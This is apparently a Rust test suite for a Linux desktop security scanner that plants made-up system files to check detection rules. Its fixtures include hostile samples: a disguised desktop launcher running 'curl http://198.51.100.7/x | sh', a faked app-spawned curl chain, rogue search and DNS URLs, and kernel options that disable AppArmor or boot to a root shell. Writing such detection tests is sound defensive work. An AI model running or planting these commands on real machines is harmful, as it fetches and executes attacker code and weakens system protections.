//! Remote screens, app sandboxes, browser helpers, local network services, boot options,
//! security modules, administrator actions, update sources and new keys. Made-up files in a
//! temporary directory; nothing on the real system is read or changed.

use scanner::baseline::{self, Baseline};
use scanner::config::Config;
use scanner::modules::auth_logs::{parse_line, Kind};
use scanner::modules::bootchain::{disk_error_lines, weakening_options};
use scanner::modules::browsers::{chromium_settings, firefox_settings};
use scanner::modules::desktop_session::apps::flatpak_grants;
use scanner::modules::kernelstate::apparmor_profiles;
use scanner::modules::netlocal::{dns_outside_vpn, is_bluetooth_keyboard, open_shares, risky_exports, unknown_servers};
use scanner::modules::procwatch::judge_spawn;
use scanner::modules::tunnels::agent_forwarding;
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn program(root: &Path, abs: &str, content: &str) {
    write(root, abs, content);
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<(Severity, &'a str)> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| (f.severity, f.title.as_str())).collect()
}

fn levels(report: &Report, rule: &str) -> Vec<Severity> {
    of(report, rule).into_iter().map(|f| f.0).collect()
}

fn fake_process(root: &Path, pid: u32, ppid: u32, exe: &str, cmdline: &str) {
    write(root, &format!("/proc/{pid}/stat"), &format!("{pid} (p) S {ppid} 1 1 0 -1 4194560 0 0\n"));
    write(root, &format!("/proc/{pid}/status"), &format!("Name:\tp\nPPid:\t{ppid}\nUid:\t1000 1000 1000 1000\n"));
    write(root, &format!("/proc/{pid}/cmdline"), cmdline);
    symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("link");
}

#[test]
fn desktop_apps_remote_screens_flatpak_snap_and_appimage() {
    let grants = flatpak_grants("[Context]\nfilesystems=host;!home;xdg-download:ro;\nsockets=x11;\n\n[Session Bus Policy]\norg.freedesktop.Flatpak=talk\norg.example.Other=talk\n");
    assert_eq!(grants.iter().map(|g| g.0).collect::<Vec<_>>(), vec![Severity::Medium, Severity::Low, Severity::High]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/share/xsessions/x.desktop", "");
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.local/share/flatpak/overrides/org.example.App", "[Context]\nfilesystems=home;\n");
    write(root, "/var/lib/flatpak/app/org.example.Big/current/active/metadata", "[Context]\nfilesystems=host;\n");
    write(root, "/var/lib/flatpak/repo/config", "[remote \"flathub\"]\nurl=https://dl.flathub.org/repo/\n[remote \"other\"]\nurl=http://198.51.100.7/repo\ngpg-verify=false\n");
    write(root, "/snap/tool/x1/meta/snap.yaml", "name: tool\n");
    symlink("x1", root.join("snap/tool/current")).expect("link");
    write(root, "/snap/editor/9/meta/snap.yaml", "name: editor\nconfinement: classic\n");
    symlink("9", root.join("snap/editor/current")).expect("link");
    program(root, "/home/anna/Applications/Thing.AppImage", "\u{7f}ELF....AI\u{2}rest");
    program(root, "/home/anna/Applications/plain", "\u{7f}ELF........");
    write(root, "/home/anna/.config/krfbrc", "[Security]\nallowUnattendedAccess=true\n");
    write(root, "/home/anna/.config/kscreenlockerrc", "[Daemon]\nAutolock=false\n");
    fake_process(root, 40, 1, "/home/anna/rustdesk", "rustdesk");
    fake_process(root, 41, 1, "/usr/bin/anydesk", "anydesk");
    let report = scan(root, &[ModuleId::DesktopSession]);

    let screens = levels(&report, "DESK-REMOTE-SCREEN");
    assert_eq!(screens.len(), 3, "{screens:?}");
    assert_eq!(screens.iter().filter(|s| **s == Severity::High).count(), 1);
    assert_eq!(levels(&report, "DESK-FLATPAK-OVERRIDE"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-FLATPAK-REMOTE"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-FLATPAK-ACCESS"), vec![Severity::Low]);
    assert_eq!(levels(&report, "DESK-SNAP"), vec![Severity::Medium, Severity::Low]);
    let images = report.findings.iter().find(|f| f.rule == "DESK-APPIMAGE").expect("appimage");
    assert!(images.evidence.contains("Thing.AppImage") && !images.evidence.contains("plain"));
    assert!(of(&report, "PERS-SCREEN-LOCK")[0].1.starts_with("[kde] "));
    assert!(of(&report, "DESK-SNAP")[0].1.starts_with("[snap] "));
}

#[test]
fn browser_helpers_search_and_dns() {
    let chrome = serde_json::json!({
        "default_search_provider_data": {"template_url_data": {"url": "https://search.evil.example/?q={searchTerms}"}},
        "dns_over_https": {"templates": "https://dns.quad9.net/dns-query"},
    });
    assert_eq!(chromium_settings(&chrome).len(), 1);
    assert!(chromium_settings(&serde_json::json!({"default_search_provider_data": {"template_url_data": {"url": "https://duckduckgo.com/?q=x"}}})).is_empty());
    assert_eq!(firefox_settings("user_pref(\"network.trr.mode\", 3);\nuser_pref(\"network.trr.uri\", \"https://dns.evil.example/q\");\n").len(), 1);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/var/lib/dpkg/info/k.list", "/usr/bin/keepassxc-proxy\n/usr/lib/mozilla/native-messaging-hosts/k.json\n");
    write(root, "/usr/lib/mozilla/native-messaging-hosts/k.json", "{\"path\": \"/usr/bin/keepassxc-proxy\"}");
    write(root, "/home/anna/.mozilla/native-messaging-hosts/bad.json", "{\"path\": \"/home/anna/.cache/h\"}");
    write(root, "/home/anna/.config/chromium/NativeMessagingHosts/own.json", "{\"path\": \"/home/anna/tools/host\"}");
    write(root, "/home/anna/Desktop/Invoice.pdf.desktop", "[Desktop Entry]\nExec=/usr/bin/true\n");
    write(root, "/home/anna/Desktop/Game.desktop", "[Desktop Entry]\nExec=sh -c 'curl http://198.51.100.7/x | sh'\n");
    let report = scan(root, &[ModuleId::FsPerms]);
    let mut native = levels(&report, "FS-BROWSER-NATIVE");
    native.sort();
    assert_eq!(native, vec![Severity::Low, Severity::High]);
    assert_eq!(of(&report, "FS-DOWNLOAD-DISGUISED").len(), 1);
    assert_eq!(levels(&report, "FS-SCRIPT-SUSPICIOUS"), vec![Severity::Critical]);
}

#[test]
fn local_services_dns_and_tools_started_by_apps() {
    assert!(is_bluetooth_keyboard("[General]\nName=K\nClass=0x002540\n"));
    assert!(is_bluetooth_keyboard("[General]\nAppearance=0x03c1\n"));
    assert!(!is_bluetooth_keyboard("[General]\nName=Headset\nClass=0x240404\n"));
    assert_eq!(risky_exports("/srv 10.0.0.2(rw,no_root_squash)\n/pub *(ro)\n/x *(rw)\n").len(), 2);
    assert_eq!(open_shares("[global]\nguest ok = yes\n[open]\npublic = yes\nread only = no\n[look]\nguest ok = yes\n"), vec!["[open] guest ok, writable"]);
    let trusted = Config::default().trusted_resolvers;
    assert_eq!(unknown_servers("1.1.1.1 203.0.114.9#x 192.168.1.1 8.8.4.4", &trusted), vec!["203.0.114.9"]);
    // default route through wg0, DNS on the Wi-Fi network 192.168.1.0/24
    let route = "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\n\
wg0\t00000000\t00000000\t0001\t0\t0\t0\t00000000\n\
wlan0\t0001A8C0\t00000000\t0001\t0\t0\t600\t00FFFFFF\n";
    assert_eq!(dns_outside_vpn(route, "nameserver 192.168.1.1\n").len(), 1);
    assert!(dns_outside_vpn(route, "nameserver 10.8.0.1\n").is_empty());
    assert!(dns_outside_vpn(&route.replace("wg0", "eth0"), "nameserver 192.168.1.1\n").is_empty());

    assert_eq!(judge_spawn("evince", "bash", "bash -c x"), Some(Severity::High));
    assert_eq!(judge_spawn("firefox-esr", "curl", "curl http://x"), Some(Severity::High));
    assert_eq!(judge_spawn("chromium", "python3.13", "python3.13 /tmp/x.py"), Some(Severity::Medium));
    assert_eq!(judge_spawn("firefox-esr", "python3", "python3 /usr/lib/mozilla/native-messaging-hosts/h.py x"), None);
    assert_eq!(judge_spawn("firefox-esr", "sh", "sh /usr/bin/xdg-open file"), None);
    assert_eq!(judge_spawn("dolphin", "bash", "bash"), None);
    assert_eq!(agent_forwarding("Host build\n  ForwardAgent yes\nHost *\n  ForwardAgent=yes\n"), vec!["build", "*"]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/var/lib/bluetooth/AA:BB/settings", "[General]\nDiscoverable=true\n");
    write(root, "/var/lib/bluetooth/AA:BB/11:22/info", "[General]\nName=Keys\nClass=0x002540\n");
    write(root, "/etc/exports", "/srv *(rw,no_root_squash)\n");
    write(root, "/etc/systemd/resolved.conf.d/x.conf", "[Resolve]\nDNS=203.0.114.9\n");
    fake_process(root, 50, 1, "/usr/bin/evince", "evince");
    fake_process(root, 51, 50, "/usr/bin/dash", "sh -c x");
    fake_process(root, 52, 51, "/usr/bin/curl", "curl http://198.51.100.7/");
    write(root, "/proc/net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 777 1 0 100 0 0 10 0\n");
    fake_process(root, 60, 1, "/usr/bin/python3.13", "python3\0-m\0http.server");
    fs::create_dir_all(root.join("proc/60/fd")).expect("mkdir");
    symlink("socket:[777]", root.join("proc/60/fd/3")).expect("fd");
    let report = scan(root, &[ModuleId::NetProc, ModuleId::ProcAudit]);
    assert_eq!(of(&report, "NET-BLUETOOTH").len(), 2);
    assert_eq!(levels(&report, "NET-SHARE"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "NET-DNS-CONFIG"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "NET-LOCAL-SERVER"), vec![Severity::Low]);
    assert!(of(&report, "NET-BINDSHELL").is_empty());
    assert_eq!(levels(&report, "PROC-APP-SPAWN"), vec![Severity::High, Severity::High]);
    assert!(report.notes.iter().any(|n| n.contains("1 only for this computer")), "{:?}", report.notes);
}

#[test]
fn boot_chain_security_modules_and_disk_errors() {
    let options: Vec<Severity> = weakening_options("BOOT_IMAGE=/vmlinuz root=/dev/sda ro quiet apparmor=0 init=/bin/bash mitigations=off").into_iter().map(|o| o.0).collect();
    assert_eq!(options, vec![Severity::High, Severity::High, Severity::Medium]);
    assert!(weakening_options("root=UUID=x ro quiet splash init=/lib/systemd/systemd security=apparmor").is_empty());
    assert_eq!(disk_error_lines(["kernel: blk_update_request: I/O error, dev sda", "kernel: XFS (sda): Ending clean mount", "ok"].into_iter()).len(), 1);
    assert_eq!(apparmor_profiles("/usr/bin/a (enforce)\nlibreoffice (complain)\nx (unconfined)\n"), (1, vec!["libreoffice".to_string()]));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/cmdline", "ro quiet\n");
    write(root, "/etc/default/grub", "GRUB_CMDLINE_LINUX_DEFAULT=\"quiet nokaslr\"\n");
    write(root, "/boot/vmlinuz-6.1", "replaced");
    write(root, "/var/lib/dpkg/info/linux-image.md5sums", "919c8b643b7133116b02fc0d9bb7df3f  boot/vmlinuz-6.1\n");
    program(root, "/etc/grub.d/09_extra", "#!/bin/sh\necho\n");
    // a note that update-grub never runs
    write(root, "/etc/grub.d/.script_sources.txt", "x\n");
    write(root, "/sys/fs/ext4/sda1/errors_count", "3\n");
    write(root, "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h sshd[1]: session opened\n2026-01-02T08:00:00+01:00 h sudo[2]: session opened\n");
    let report = scan(root, &[ModuleId::Integrity]);
    assert_eq!(levels(&report, "INT-BOOT-OPTIONS"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "INT-KERNEL-FILE"), vec![Severity::Critical]);
    assert_eq!(levels(&report, "INT-GRUB-SCRIPT"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "INT-DISK-ERRORS"), vec![Severity::Low]);
    assert!(report.findings.iter().any(|f| f.rule == "INT-TIME-BACKWARDS" && f.evidence.contains("within 10 minutes")));

    write(root, "/sys/module/apparmor/parameters/enabled", "Y\n");
    let before = scan(root, &[ModuleId::Kernel]);
    assert!(of(&before, "KERN-APPARMOR-OFF").is_empty());
    write(root, "/sys/module/apparmor/parameters/enabled", "N\n");
    let after = scan(root, &[ModuleId::Kernel]);
    assert_eq!(levels(&after, "KERN-APPARMOR-OFF"), vec![Severity::Medium]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&before), &after.inventory, &after.modules);
    assert!(changes.iter().any(|f| f.rule == "BASE-APPARMOR-OFF" && f.severity == Severity::High));
}

#[test]
fn administrator_actions_and_update_sources() {
    let line = |text: &str| parse_line(&format!("2026-01-02T10:00:00+01:00 h {text}")).map(|e| (e.kind, e.user));
    assert_eq!(line("pkexec[1]: anna: Executing command [USER=root] [TTY=unknown] [CWD=/home/anna] [COMMAND=/tmp/x --y]"), Some((Kind::PkexecRun { command: "/tmp/x --y".into() }, "anna".into())));
    assert_eq!(
        line("polkitd[2]: Operator of unix-session:2 FAILED to authenticate to gain authorization for action org.x.y for system-bus-name::1.5 [a] (owned by unix-user:anna)"),
        Some((Kind::PolkitFailed { action: "org.x.y".into() }, "anna".into()))
    );
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h polkitd[2]: Operator of unix-session:2 successfully authenticated as unix-user:root to gain ONE-SHOT authorization for action org.a.b for unix-process:1 [x] (owned by unix-user:anna)\n2026-01-02T10:01:00+01:00 h pkexec[1]: anna: Executing command [USER=root] [COMMAND=/tmp/x]\n");
    let report = scan(root, &[ModuleId::AuthLogs]);
    assert_eq!(levels(&report, "AUTH-ADMIN-ACTIONS"), vec![Severity::Medium]);

    write(root, "/etc/os-release", "VERSION_CODENAME=trixie\n");
    write(root, "/etc/apt/sources.list", "deb http://deb.debian.org/debian trixie main\ndeb http://deb.debian.org/debian bookworm main\n");
    write(root, "/proc/cpuinfo", "vendor_id\t: GenuineIntel\nflags\t\t: fpu sse\n");
    write(root, "/var/lib/dpkg/status", "Package: intel-microcode\nStatus: deinstall ok config-files\n\nPackage: other\nStatus: install ok installed\n");
    let report = scan(root, &[ModuleId::Updates]);
    assert_eq!(levels(&report, "UPD-NO-SECURITY-REPO"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "UPD-OLD-REPO"), vec![Severity::Low]);
    assert_eq!(levels(&report, "UPD-MICROCODE"), vec![Severity::Medium]);

    write(root, "/etc/apt/sources.list.d/s.sources", "Types: deb\nURIs: http://security.debian.org/debian-security\nSuites: trixie-security\n");
    assert!(of(&scan(root, &[ModuleId::Updates]), "UPD-NO-SECURITY-REPO").is_empty());
}

#[test]
fn new_keys_devices_and_deleted_programs_weigh_heavily() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl";
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/var/lib/bluetooth/AA:BB/settings", "");
    let before = scan(root, &[ModuleId::Persistence, ModuleId::NetProc]);
    assert_eq!(before.inventory.ssh_keys, Some(Vec::new()));
    write(root, "/home/anna/.ssh/authorized_keys", &format!("{key} someone\n"));
    write(root, "/var/lib/bluetooth/AA:BB/11:22/info", "[General]\nName=Keys\nClass=0x002540\n");
    let after = scan(root, &[ModuleId::Persistence, ModuleId::NetProc]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&before), &after.inventory, &after.modules);
    let level = |rule: &str| changes.iter().find(|f| f.rule == rule).map(|f| f.severity);
    assert_eq!(level("BASE-SSH-KEY-NEW"), Some(Severity::Critical));
    assert_eq!(level("BASE-BLUETOOTH-NEW"), Some(Severity::High));
    // a changed comment is not a new key
    write(root, "/home/anna/.ssh/authorized_keys", &format!("{key} renamed\n"));
    let renamed = scan(root, &[ModuleId::Persistence]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&after), &renamed.inventory, &renamed.modules);
    assert!(!changes.iter().any(|f| f.rule == "BASE-SSH-KEY-NEW"));

    fake_process(root, 70, 1, "/dev/shm/k (deleted)", "k");
    let report = scan(root, &[ModuleId::ProcAudit]);
    assert_eq!(levels(&report, "PROC-DELETED"), vec![Severity::Critical]);
}
